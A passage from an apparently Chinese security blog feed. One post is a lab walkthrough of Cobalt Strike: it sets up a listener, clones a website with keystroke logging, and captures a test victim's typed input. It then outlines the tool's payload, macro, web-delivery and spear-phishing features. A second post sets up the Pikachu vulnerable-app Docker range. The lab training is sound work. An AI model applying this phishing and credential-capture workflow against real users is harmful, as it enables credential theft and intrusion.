&lt;h4 id="创建监听器"&gt;创建监听器
&lt;/h4&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/2.png"
width="756"
height="535"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/2_hu_fda38b9c08f2b636.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/2_hu_2e8ceeeb629cb410.png 1024w"
loading="lazy"
alt="2"
class="gallery-image"
data-flex-grow="141"
data-flex-basis="339px"
&gt;&lt;/p&gt;
&lt;p&gt;打开监听器选项，点击添加&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/3.png"
width="726"
height="542"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/3_hu_615b68a541da84ce.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/3_hu_75b47fa3a0653c98.png 1024w"
loading="lazy"
alt="3"
class="gallery-image"
data-flex-grow="133"
data-flex-basis="321px"
&gt;&lt;/p&gt;
&lt;p&gt;HTTP地址为Kali地址，HTTP端口为钓鱼网站端口。添加监听器后，CS将在Kali的80端口上持续监听&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/4.png"
width="771"
height="322"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/4_hu_4e8ab27613210910.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/4_hu_ec7f5d2c9270931e.png 1024w"
loading="lazy"
alt="4"
class="gallery-image"
data-flex-grow="239"
data-flex-basis="574px"
&gt;&lt;/p&gt;
&lt;h4 id="网站克隆与web日志"&gt;网站克隆与Web日志
&lt;/h4&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/5.png"
width="765"
height="520"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/5_hu_288c220c0dffa191.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/5_hu_45a6d554b5da9af5.png 1024w"
loading="lazy"
alt="5"
class="gallery-image"
data-flex-grow="147"
data-flex-basis="353px"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/6.png"
width="772"
height="527"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/6_hu_ffb2ad471411bcb7.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/6_hu_48f3c5c03aab573f.png 1024w"
loading="lazy"
alt="6"
class="gallery-image"
data-flex-grow="146"
data-flex-basis="351px"
&gt;&lt;/p&gt;
&lt;p&gt;“克隆URL”中填写要伪装的网站，这里只支持HTTP协议。“本地HOST”为本地Kali的IP地址，也是伪装网址的IP地址；“本地端口”为伪装网址的运行端口，与监听器相一致；开启键盘记录&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/7.png"
width="772"
height="523"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/7_hu_29b282956dc8cae.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/7_hu_74a13f5a50e50d70.png 1024w"
loading="lazy"
alt="7"
class="gallery-image"
data-flex-grow="147"
data-flex-basis="354px"
&gt;&lt;/p&gt;
&lt;p&gt;最终访问地址为http://192.168.10.135:80/。由于网络适配器为NAT模式。因此所有NAT连接的虚拟机以及宿主机都可访问该页面。&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/8.png"
width="765"
height="528"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/8_hu_78e0ec527b90416.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/8_hu_4c8b308905dbb9a4.png 1024w"
loading="lazy"
alt="8"
class="gallery-image"
data-flex-grow="144"
data-flex-basis="347px"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/9.png"
width="770"
height="526"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/9_hu_633d48dec21a7da0.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/9_hu_47d82424b044b855.png 1024w"
loading="lazy"
alt="9"
class="gallery-image"
data-flex-grow="146"
data-flex-basis="351px"
&gt;&lt;/p&gt;
&lt;p&gt;打开Web日志。&lt;/p&gt;
&lt;h4 id="靶机访问钓鱼网站"&gt;靶机访问钓鱼网站
&lt;/h4&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/10.png"
width="796"
height="561"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/10_hu_fed279ba64956bd.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/10_hu_6ea032db29babd84.png 1024w"
loading="lazy"
alt="10"
class="gallery-image"
data-flex-grow="141"
data-flex-basis="340px"
&gt;在Win7的浏览器中访问伪装网址，输入Kali&lt;/p&gt;
&lt;h4 id="键盘记录"&gt;键盘记录
&lt;/h4&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/11.png"
width="768"
height="527"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/11_hu_131a8edf5c77aa3c.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/11_hu_a2edf1ef002e4be7.png 1024w"
loading="lazy"
alt="11"
class="gallery-image"
data-flex-grow="145"
data-flex-basis="349px"
&gt;&lt;/p&gt;
&lt;p&gt;Web日志中打印Win7的键盘输入。该手段用于获取用户的密码等敏感信息。&lt;/p&gt;
&lt;h3 id="cs菜单功能概览"&gt;CS菜单功能概览
&lt;/h3&gt;&lt;h4 id="视图"&gt;视图
&lt;/h4&gt;&lt;p&gt;此菜单主要用于管理和查看在后渗透阶段（Post-Exploitation）收集到的各类数据。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;应用程序 (Applications)&lt;/strong&gt;：显示由“系统分析器（System Profiler）”收集到的目标浏览器信息，包括浏览器版本、Flash版本、Java版本等，帮助你判断目标有哪些可被利用的客户端漏洞。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;密码凭证 (Credentials)&lt;/strong&gt;：这是一个中央数据库，存储所有通过 &lt;code&gt;hashdump&lt;/code&gt;、&lt;code&gt;mimikatz&lt;/code&gt; 或钓鱼攻击获取到的用户名、密码、NTLM 哈希及令牌。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;下载列表 (Downloads)&lt;/strong&gt;：记录所有从受控主机下载到 Team Server 的文件。你可以在这里右键将文件保存到本地。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;事件日志 (Event Log)&lt;/strong&gt;：整个团队的“聊天室”和审计中心。记录了谁上线了、执行了什么关键命令，以及团队成员之间的即时消息沟通。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;键盘记录 (Keystrokes)&lt;/strong&gt;：集中展示通过 &lt;code&gt;keylogger&lt;/code&gt; 命令抓取到的所有目标击键记录。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代理转发 (Proxy Pivots)&lt;/strong&gt;：管理 SOCKS 代理和反向端口转发。当你想利用受控主机作为跳板攻击内网其他机器时，在这里配置代理信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;屏幕截图 (Screenshots)&lt;/strong&gt;：展示所有从 Beacon 发回的屏幕截图。支持缩略图预览，方便快速查看目标当前的操作界面。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;脚本控制台 (Script Console)&lt;/strong&gt;：用于加载和调试 &lt;strong&gt;Aggressor Script&lt;/strong&gt;（CS 的自动化脚本语言）。你可以在这里看到脚本运行的输出或错误信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目标列表 (Targets)&lt;/strong&gt;：列出当前网络中所有已知的计算机及其元数据（IP、系统版本等）。你可以通过扫描或导入方式增加目标。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Web日志 (Web Log)&lt;/strong&gt;：记录 CS 内置 Web 服务器的所有访问请求。包括谁访问了你的钓鱼页面、下载了什么文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="攻击"&gt;攻击
&lt;/h4&gt;&lt;p&gt;该菜单是 CS 的核心功能区，分为载荷生成、Web 渗透和邮件钓鱼三大类。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;生成后门 (Packages)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用于创建各种形式的初始控制载荷（Payload）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;HTA文档&lt;/strong&gt;：生成 &lt;code&gt;.hta&lt;/code&gt; 后缀的 HTML 应用程序。它常通过浏览器下载执行，利用 VBScript 或 JScript 在系统底层运行 Beacon。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Office宏&lt;/strong&gt;：生成一段 VBA 代码，你可以将其嵌入 Word 或 Excel 文档中。当受害者点击“启用宏”时，就会触发上线。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Payload生成器&lt;/strong&gt;：最基础的工具。它可以将 Beacon 生成各种格式的原始数据（Raw Shellcode），或者生成 C、C#、Java、Python 等语言的源代码供你二次开发。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Windows可执行程序&lt;/strong&gt;：生成一个 Staged（分阶段）的 EXE 或 DLL 文件。这种后门体积小，运行时会先连接服务器下载完整的 Beacon。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Windows可执行程序(Stageless)&lt;/strong&gt;：生成一个 Stageless（不分阶段）的后门。它包含完整的 Beacon 功能，虽然体积较大，但在复杂的网络环境下更稳定且更难被流量监控发现。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Web钓鱼 (Web Drive-by)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;利用 CS 内置的 Web 服务器进行自动化 Web 攻击。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;站点管理 (Manage)&lt;/strong&gt;：查看并管理当前所有正在运行的 Web 服务（克隆的页面、托管的文件等）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网站克隆 (Clone Site)&lt;/strong&gt;：输入一个网址（如公司内网登录页），CS 会克隆该页面。你还可以配置它抓取用户输入的表单数据（如账号密码）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件托管 (Host File)&lt;/strong&gt;：简单的 Web 服务器功能，用于把你的木马或工具挂在网上供目标下载。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Web投递 (Web Delivery)&lt;/strong&gt;：提供一种“一键上线”的方案。它生成一个 PowerShell、Python 或 Bitsadmin 命令，只要在目标机器运行这行命令，即可远程下载执行 Beacon。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;签名/智能 Applet 攻击&lt;/strong&gt;：利用旧版本 Java 的漏洞或诱导用户点击运行 Java 插件。&lt;em&gt;注意：由于现代浏览器已不再支持 Java 插件，这些功能在实战中已基本过时。&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;信息收集 (System Profiler)&lt;/strong&gt;：生成一个隐藏的探测链接。当用户点击时，它会静默收集该用户的系统环境信息，并存入“视图 -&amp;gt; 应用程序”中。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;邮件钓鱼 (Spear Phish)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是一个专门的钓鱼邮件发送平台。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;导入邮件模板和目标邮箱列表。&lt;/li&gt;
&lt;li&gt;配置 SMTP 发信服务器。&lt;/li&gt;
&lt;li&gt;将上述“生成后门”或“Web钓鱼”生成的链接/附件自动注入邮件并群发。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>【攻防实践】靶场搭建</title><link>http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</link><pubDate>Sat, 03 Jan 2026 12:33:34 +0800</pubDate><guid>http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</guid><description>&lt;h1 id="靶场搭建"&gt;靶场搭建
&lt;/h1&gt;&lt;div class="custom-toc"&gt;
&lt;h3&gt;目录&lt;/h3&gt;
&lt;nav id="TableOfContents"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#靶场环境"&gt;靶场环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#pikachu-docker"&gt;Pikachu-Docker&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#安装docker"&gt;安装Docker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#配置docker镜像"&gt;配置Docker镜像&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#拉取pikachu镜像"&gt;拉取Pikachu镜像&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#运行容器"&gt;运行容器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#持久化运行"&gt;持久化运行&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;
&lt;h2 id="靶场环境"&gt;靶场环境
&lt;/h2&gt;&lt;p&gt;Ubuntu 24.01 64bit&lt;/p&gt;
&lt;h2 id="pikachu-docker"&gt;Pikachu-Docker
&lt;/h2&gt;&lt;h3 id="安装docker"&gt;安装Docker
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo apt update &lt;span class="c1"&gt;# 更新软件包列表&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo install docker.io docker-compose -y &lt;span class="c1"&gt;# 安装Docker和Docker Compose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo systemctl start docker &lt;span class="c1"&gt;# 启动Docker服务&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; docker &lt;span class="c1"&gt;# 设置Docker开机自启动 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker --version &lt;span class="c1"&gt;# 查看Docker版本以验证安装&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="配置docker镜像"&gt;配置Docker镜像
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;编辑docker配置文件&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nano /etc/docker/daemon.json &lt;span class="c1"&gt;# 编辑Docekrs守护进程配置&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;添加镜像加速地址&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nt"&gt;&amp;#34;registry-mirrors&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;https://docker.1ms.run&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;https://docker-0.unsee.tech&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;https://docker.m.daocloud.io&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="c1"&gt;// 写入国内镜像加速器
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;保存并重启Docker服务&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo systemctl daemon-reload &lt;span class="c1"&gt;# 重新加载 systemd 守护进程配置&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo systemctl restart docker &lt;span class="c1"&gt;# 重启 Docker 服务使配置生效&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="拉取pikachu镜像"&gt;拉取Pikachu镜像
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo docker pull area39/pikachu
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="运行容器"&gt;运行容器
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo docker run -d --name pikachu -p 8000:80 area39/pikachu
